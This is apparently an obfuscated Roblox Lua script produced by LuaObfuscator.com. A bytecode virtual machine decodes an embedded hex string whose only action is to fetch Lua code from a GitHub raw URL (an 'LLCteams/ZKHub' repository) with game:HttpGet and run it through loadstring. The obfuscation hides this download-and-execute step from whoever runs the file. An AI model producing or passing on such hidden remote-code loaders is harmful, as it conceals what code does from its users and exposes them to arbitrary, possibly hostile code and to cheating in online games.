--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.9.14) ~  Much Love, Ferib 

]]--

local StrToNumber=tonumber;local Byte=string.byte;local Char=string.char;local Sub=string.sub;local Subg=string.gsub;local Rep=string.rep;local Concat=table.concat;local Insert=table.insert;local LDExp=math.ldexp;local GetFEnv=getfenv or function()return _ENV;end ;local Setmetatable=setmetatable;local PCall=pcall;local Select=select;local Unpack=unpack or table.unpack ;local ToNumber=tonumber;local function VMCall(ByteString,vmenv,...)local FlatIdent_95CAC=0;local DIP;local repeatNext;local gBit;local gBits8;local gBits16;local gBits32;local gFloat;local gString;local gInt;local _R;local Deserialize;local Wrap;while true do if (FlatIdent_95CAC==5) then gInt=gBits32;_R=nil;function _R(...)return {...},Select("#",...);end FlatIdent_95CAC=6;end if (FlatIdent_95CAC==1) then gBit=nil;function gBit(Bit,Start,End)if End then local Res=(Bit/(2^(Start-1)))%(2^(((End-1) -(Start-1)) + 1)) ;return Res-(Res%1) ;else local Plc=2^(Start-1) ;return (((Bit%(Plc + Plc))>=Plc) and 1) or 0 ;end end gBits8=nil;FlatIdent_95CAC=2;end if (FlatIdent_95CAC==3) then gBits32=nil;function gBits32()local a,b,c,d=Byte(ByteString,DIP,DIP + 3 );DIP=DIP + 4 ;return (d * 16777216) + (c * 65536) + (b * 256) + a ;end gFloat=nil;FlatIdent_95CAC=4;end if (FlatIdent_95CAC==6) then Deserialize=nil;function Deserialize()local Instrs={};local Functions={};local Lines={};local Chunk={Instrs,Functions,nil,Lines};local ConstCount=gBits32();local Consts={};for Idx=1,ConstCount do local FlatIdent_2FD19=0;local Type;local Cons;while true do if (FlatIdent_2FD19==0) then Type=gBits8();Cons=nil;FlatIdent_2FD19=1;end if (FlatIdent_2FD19==1) then if (Type==1) then Cons=gBits8()~=0 ;elseif (Type==2) then Cons=gFloat();elseif (Type==3) then Cons=gString();end Consts[Idx]=Cons;break;end end end Chunk[3]=gBits8();for Idx=1,gBits32() do local Descriptor=gBits8();if (gBit(Descriptor,1,1)==0) then local Type=gBit(Descriptor,2,3);local Mask=gBit(Descriptor,4,6);local Inst={gBits16(),gBits16(),nil,nil};if (Type==0) then Inst[3]=gBits16();Inst[4]=gBits16();elseif (Type==1) then Inst[3]=gBits32();elseif (Type==2) then Inst[3]=gBits32() -(2^16) ;elseif (Type==3) then Inst[3]=gBits32() -(2^16) ;Inst[4]=gBits16();end if (gBit(Mask,1,1)==1) then Inst[2]=Consts[Inst[2]];end if (gBit(Mask,2,2)==1) then Inst[3]=Consts[Inst[3]];end if (gBit(Mask,3,3)==1) then Inst[4]=Consts[Inst[4]];end Instrs[Idx]=Inst;end end for Idx=1,gBits32() do Functions[Idx-1 ]=Deserialize();end return Chunk;end Wrap=nil;FlatIdent_95CAC=7;end if (FlatIdent_95CAC==4) then function gFloat()local Left=gBits32();local Right=gBits32();local IsNormal=1;local Mantissa=(gBit(Right,1,20) * (2^32)) + Left ;local Exponent=gBit(Right,21,31);local Sign=((gBit(Right,32)==1) and  -1) or 1 ;if (Exponent==0) then if (Mantissa==0) then return Sign * 0 ;else Exponent=1;IsNormal=0;end elseif (Exponent==2047) then return ((Mantissa==0) and (Sign * (1/0))) or (Sign * NaN) ;end return LDExp(Sign,Exponent-1023 ) * (IsNormal + (Mantissa/(2^52))) ;end gString=nil;function gString(Len)local FlatIdent_6FA1=0;local Str;local FStr;while true do if (FlatIdent_6FA1==1) then Str=Sub(ByteString,DIP,(DIP + Len) -1 );DIP=DIP + Len ;FlatIdent_6FA1=2;end if (FlatIdent_6FA1==2) then FStr={};for Idx=1, #Str do FStr[Idx]=Char(Byte(Sub(Str,Idx,Idx)));end FlatIdent_6FA1=3;end if (0==FlatIdent_6FA1) then Str=nil;if  not Len then local FlatIdent_455BF=0;while true do if (FlatIdent_455BF==0) then Len=gBits32();if (Len==0) then return "";end break;end end end FlatIdent_6FA1=1;end if (FlatIdent_6FA1==3) then return Concat(FStr);end end end FlatIdent_95CAC=5;end if (FlatIdent_95CAC==2) then function gBits8()local FlatIdent_8F047=0;local a;while true do if (FlatIdent_8F047==0) then a=Byte(ByteString,DIP,DIP);DIP=DIP + 1 ;FlatIdent_8F047=1;end if (FlatIdent_8F047==1) then return a;end end end gBits16=nil;function gBits16()local a,b=Byte(ByteString,DIP,DIP + 2 );DIP=DIP + 2 ;return (b * 256) + a ;end FlatIdent_95CAC=3;end if (FlatIdent_95CAC==0) then DIP=1;repeatNext=nil;ByteString=Subg(Sub(ByteString,5),"..",function(byte)if (Byte(byte,2)==79) then repeatNext=StrToNumber(Sub(byte,1,1));return "";else local FlatIdent_475BC=0;local a;while true do if (FlatIdent_475BC==0) then a=Char(StrToNumber(byte,16));if repeatNext then local FlatIdent_60EA1=0;local b;while true do if (FlatIdent_60EA1==1) then return b;end if (FlatIdent_60EA1==0) then b=Rep(a,repeatNext);repeatNext=nil;FlatIdent_60EA1=1;end end else return a;end break;end end end end);FlatIdent_95CAC=1;end if (FlatIdent_95CAC==7) then function Wrap(Chunk,Upvalues,Env)local Instr=Chunk[1];local Proto=Chunk[2];local Params=Chunk[3];return function(...)local Instr=Instr;local Proto=Proto;local Params=Params;local _R=_R;local VIP=1;local Top= -1;local Vararg={};local Args={...};local PCount=Select("#",...) -1 ;local Lupvals={};local Stk={};for Idx=0,PCount do if (Idx>=Params) then Vararg[Idx-Params ]=Args[Idx + 1 ];else Stk[Idx]=Args[Idx + 1 ];end end local Varargsz=(PCount-Params) + 1 ;local Inst;local Enum;while true do Inst=Instr[VIP];Enum=Inst[1];if (Enum<=2) then if (Enum<=0) then Stk[Inst[2]]=Env[Inst[3]];elseif (Enum>1) then Stk[Inst[2]]();else local A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);end elseif (Enum<=3) then do return;end elseif (Enum>4) then local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]();VIP=VIP + 1 ;Inst=Instr[VIP];do return;end else Stk[Inst[2]]=Inst[3];end VIP=VIP + 1 ;end end;end return Wrap(Deserialize(),{},vmenv)(...);end end end VMCall("LOL!023O00030A3O006C6F6164737472696E6703C33O006C6F6164737472696E672867616D653A482O74704765742822682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F2O4C437465616D732F5A4B4875622F6D61696E2F254430253941254431253832254430254245253230254431253844254431253832254430254230253230254431253835254430254245254431253830254430254245254431252O382544302542302544312538462532302544302542382544302542332544312538302544302542302O2928290A00053O0012053O00013O00122O000100028O000200026O000100016O00017O00",GetFEnv(),...);
